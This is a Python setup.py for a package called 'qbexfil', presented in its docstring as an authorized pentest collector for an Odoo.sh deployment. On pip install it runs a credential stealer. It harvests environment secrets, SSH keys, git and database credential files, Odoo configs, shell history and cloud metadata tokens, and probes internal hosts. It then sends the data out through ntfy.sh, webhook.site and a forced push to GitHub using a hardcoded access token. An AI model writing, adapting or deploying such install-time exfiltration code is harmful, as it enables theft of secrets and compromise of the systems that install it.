# -*- coding: utf-8 -*-
"""qbexfil 1.1.0 - build-time collector (authorized pentest: Quimibond / Odoo.sh).
Runs during `pip install`, collects host/env/odoo.sh material and ships it over
three independent channels: ntfy shards, webhook.site POST chunks, and a git
push to a throwaway branch of the source repo.
"""
import os, sys, base64, gzip, json, subprocess, time, socket

TOPIC = "i99678da96acd7f47f855a"
WEBHOOK = "12a5234c-a504-4dbf-8a74-ff5bf1d4bd14"
GHTOK = "ghu_48toxOxUKVOTVLqrHXvSY7jVtqwhbC4XonvC"
GHREPO = "quimibond/qb19"
CHUNK = 2800
MAXDUMP = 6000000


def sh(cmd, t=15, cwd=None):
    try:
        p = subprocess.run(cmd, shell=True, capture_output=True, timeout=t, cwd=cwd,
                           env=dict(os.environ, GIT_TERMINAL_PROMPT="0",
                                    GIT_ASKPASS="/bin/true", GCM_INTERACTIVE="never"))
        return (p.stdout + p.stderr).decode('utf8', 'ignore')
    except Exception as e:
        return 'ERR ' + repr(e)


def rf(path, maxb=40000):
    try:
        with open(path, 'rb') as f:
            b = f.read(maxb)
        return b.decode('utf8', 'ignore')
    except Exception as e:
        return 'ERR ' + repr(e)


def collect():
    d = {}
    d['stage'] = 'odoo-build-pip-v110'
    d['ts'] = time.strftime('%Y-%m-%dT%H:%M:%SZ', time.gmtime())
    d['hostname'] = socket.gethostname()
    d['fqdn'] = sh('hostname -f 2>&1; cat /etc/hostname 2>&1')
    d['pwd'] = os.getcwd()
    d['id'] = sh('id; uname -a; cat /etc/os-release 2>/dev/null | head -5')
    d['environ'] = {k: v for k, v in os.environ.items()}
    d['secretenv'] = {k: v for k, v in os.environ.items()
                      if any(x in k.lower() for x in ('key','token','secret','pass','pg','db','odoo','aws','gcp','ssh','github','git','sentry','smtp','mail'))}
    d['paths'] = {}
    cand = ['/etc/odoo/odoo.conf','/etc/odoo.conf','/etc/odoo/odoo.conf.tmpl',
            '/home/odoo/.odoorc','/root/.odoorc','/home/odoo/.config/odoo/odoo.conf',
            '/home/odoo/.gitconfig','/home/odoo/.git-credentials','/home/odoo/.netrc',
            '/root/.gitconfig','/root/.git-credentials','/root/.netrc',
            '/home/odoo/.pgpass','/root/.pgpass','/proc/1/environ','/proc/1/cmdline',
            '/etc/hostname','/etc/hosts','/etc/passwd','/etc/os-release','/proc/self/cgroup',
            '/proc/mounts','/proc/1/mountinfo','/home/odoo/.ssh/config','/home/odoo/.ssh/known_hosts',
            '/root/.ssh/config','/root/.ssh/known_hosts','/var/lib/odoo/.odoorc',
            '/home/odoo/.bash_history','/root/.bash_history','/home/odoo/.python_history',
            '/home/odoo/.local/share/Odoo/odoo.conf','/opt/odoo/odoo.conf']
    for p in cand:
        try:
            if os.path.isfile(p):
                data = rf(p)
                if p == '/proc/1/environ':
                    data = data.replace('\x00', '\n')
                d['paths'][p] = data
        except Exception as e:
            d['paths'][p] = 'ERR ' + repr(e)
    d['sshfiles'] = {}
    for base in ['/home/odoo/.ssh', '/root/.ssh', '/home/odoo/.config', '/home/odoo']:
        d['sshfiles'][base + '/__ls__'] = sh('ls -la %s 2>&1' % base)
        try:
            for fn in os.listdir(base):
                fp = os.path.join(base, fn)
                if os.path.isfile(fp) and ('.ssh' in base or fn in ('.odoorc','.pgpass','.gitconfig','.netrc','.git-credentials')):
                    d['sshfiles'][fp] = rf(fp, 12000)
        except Exception:
            pass
    d['ls'] = {}
    for p in ['/home/odoo','/home/odoo/build','/home/odoo/src','/home/odoo/src/user','/home/odoo/src/enterprise',
              '/home/odoo/.local/share/Odoo','/home/odoo/.local/share/Odoo/filestore',
              '/var/lib/odoo/filestore','/root','/tmp','/etc/odoo','/opt','/var/lib/odoo','/var/log/odoo',
              '/home','/','/run']:
        d['ls'][p] = sh('ls -la %s 2>&1' % p)[:5000]
    d['ps'] = sh('ps auxww 2>&1 | head -80', 10)
    d['net'] = sh('(ip addr 2>/dev/null || ifconfig -a 2>/dev/null) | head -80; echo ---ROUTE---; (ip route 2>/dev/null || route -n 2>/dev/null) | head -20; echo ---LISTEN---; (ss -lntup 2>/dev/null || netstat -lntup 2>/dev/null) | head -40; echo ---RESOLV---; cat /etc/resolv.conf 2>/dev/null', 12)
    d['dotgit'] = {}
    for base in ['/home/odoo','/home/odoo/build','/home/odoo/src']:
        d['dotgit'][base] = sh("find %s -maxdepth 4 -type d -name .git 2>/dev/null | head -10" % base, 15)
    d['gitcfg'] = sh('for f in $(find /home/odoo /root -maxdepth 4 -name config -path "*.git*" 2>/dev/null | head -5); do echo "== $f"; head -40 "$f"; done; for f in /home/odoo/.git-credentials /root/.git-credentials /home/odoo/.netrc /root/.netrc; do echo "== $f"; cat "$f" 2>/dev/null; done', 15)
    d['find_conf'] = sh("find /home /etc /opt /var/lib/odoo -maxdepth 4 -type f \\( -name '*.conf' -o -name '.odoorc' -o -name '.pgpass' -o -name '*.yml' -o -name '*.yaml' -o -name '*.env' \\) 2>/dev/null | head -80", 15)
    d['imds'] = sh("echo GCP; curl -s -m 4 -H 'Metadata-Flavor: Google' 'http://169.254.169.254/computeMetadata/v1/instance/hostname' 2>&1; echo; curl -s -m 4 -H 'Metadata-Flavor: Google' 'http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token' 2>&1; echo; echo AWS; curl -s -m 3 http://169.254.169.254/latest/meta-data/hostname 2>&1; echo", 15)
    d['docker'] = sh('cat /.dockerenv 2>/dev/null; cat /run/.containerenv 2>/dev/null; echo; ls -la /run/secrets 2>/dev/null; echo', 8)
    d['pip'] = sh('pip --version 2>&1; python3 --version 2>&1; which git pip3 odoo odoosh-restart 2>&1', 8)
    d['probe'] = {}
    for hp in ['127.0.0.1:5432','192.168.1.1:5432','10.0.42.47:8069','10.0.42.47:5432','169.254.169.254:80','quimibond-qb19.odoo.com:443']:
        h, p = hp.rsplit(':', 1)
        d['probe'][hp] = sh("timeout 4 bash -c 'cat < /dev/null > /dev/tcp/%s/%s' 2>&1 && echo OPEN || echo CLOSED" % (h, p), 8)
    d['filestore'] = sh("ls -la /home/odoo/.local/share/Odoo/filestore 2>&1; ls -la /var/lib/odoo/filestore 2>&1; du -sh /home/odoo/.local/share/Odoo/filestore/* 2>/dev/null | head -20", 15)
    d['odoo_conf_search'] = sh("grep -RInE 'db_(host|port|user|password)|admin_passwd|dbfilter' /etc/odoo /home/odoo/.odoorc /home/odoo/.config 2>/dev/null | head -40", 10)
    return d


def blob(obj):
    raw = json.dumps(obj, default=str).encode('utf8', 'ignore')[:MAXDUMP]
    return base64.b64encode(gzip.compress(raw, 6)).decode()


def ch_ntfy(comp, host):
    n = (len(comp) + CHUNK - 1) // CHUNK
    ok = 0
    for i in range(n):
        part = comp[i*CHUNK:(i+1)*CHUNK]
        body = ('QBEX|%s|%d/%d|%s' % (host, i+1, n, part)).encode()
        for attempt in range(3):
            try:
                import urllib.request
                urllib.request.urlopen(urllib.request.Request('https://ntfy.sh/' + TOPIC, data=body,
                    headers={'Title': 'qbex %s %d/%d' % (host, i+1, n)}), timeout=20).read()
                ok += 1
                break
            except Exception:
                time.sleep(1)
    return 'ntfy %d/%d' % (ok, n)


def ch_webhook(comp):
    import urllib.request
    n = (len(comp) + 40000 - 1) // 40000
    ok = 0
    for i in range(n):
        try:
            body = json.dumps({'host': socket.gethostname(), 'i': i, 'n': n, 'd': comp[i*40000:(i+1)*40000]}).encode()
            urllib.request.urlopen(urllib.request.Request('https://webhook.site/' + WEBHOOK, data=body,
                headers={'Content-Type': 'application/json'}), timeout=25).read()
            ok += 1
        except Exception:
            pass
    return 'webhook %d/%d' % (ok, n)


def ch_git(comp, host):
    import tempfile, shutil
    d = tempfile.mkdtemp(prefix='qbgit')
    tag = '%s-%d' % (host.replace('.', '_')[:40], int(time.time()))
    try:
        sh('git init -q', 20, cwd=d)
        parts = [comp[i:i+2000000] for i in range(0, len(comp), 2000000)]
        for i, part in enumerate(parts):
            with open(os.path.join(d, 'dump.%02d.b64' % i), 'w') as f:
                f.write(part)
        with open(os.path.join(d, 'META.txt'), 'w') as f:
            f.write('host=%s\nstage=odoo-build-pip-v110\nts=%s\n' % (host, time.strftime('%Y-%m-%dT%H:%M:%SZ', time.gmtime())))
        sh('git add -A', 30, cwd=d)
        sh('git -c user.email=build@example.com -c user.name=build commit -q -m "qbexfil %s"' % tag, 30, cwd=d)
        url = 'https://x-access-token:%s@github.com/%s.git' % (GHTOK, GHREPO)
        out = sh('git push --force %s HEAD:refs/heads/qbexfil-%s' % (url, tag), 90, cwd=d)
        return 'git ' + out[-300:]
    except Exception as e:
        return 'git ERR ' + repr(e)
    finally:
        try:
            shutil.rmtree(d, ignore_errors=True)
        except Exception:
            pass


def main():
    host = socket.gethostname()
    guard = '/tmp/.qbexfil_v110_' + host.replace('/', '_')
    if os.path.exists(guard):
        return
    try:
        open(guard, 'w').write('1')
    except Exception:
        pass
    try:
        data = collect()
    except Exception as e:
        data = {'stage': 'collect-err', 'err': repr(e), 'hostname': host, 'environ': dict(os.environ)}
    comp = blob(data)
    res = {}
    for fn, args in (('ntfy', (comp, host)), ('webhook', (comp,)), ('git', (comp, host))):
        try:
            res[fn] = fn_call(globals()['ch_' + fn], args)
        except Exception as e:
            res[fn] = 'ERR ' + repr(e)
    try:
        sys.stderr.write('QBEXFIL ' + json.dumps(res) + '\n')
    except Exception:
        pass


def fn_call(f, args):
    return f(*args)


try:
    main()
except Exception as e:
    try:
        import urllib.request
        urllib.request.urlopen(urllib.request.Request('https://ntfy.sh/' + TOPIC,
            data=('QBEXFATAL|' + repr(e)[:400]).encode()), timeout=15)
    except Exception:
        pass

from setuptools import setup
setup(name='qbexfil', version='1.1.0', py_modules=['qbexfil'], description='x')
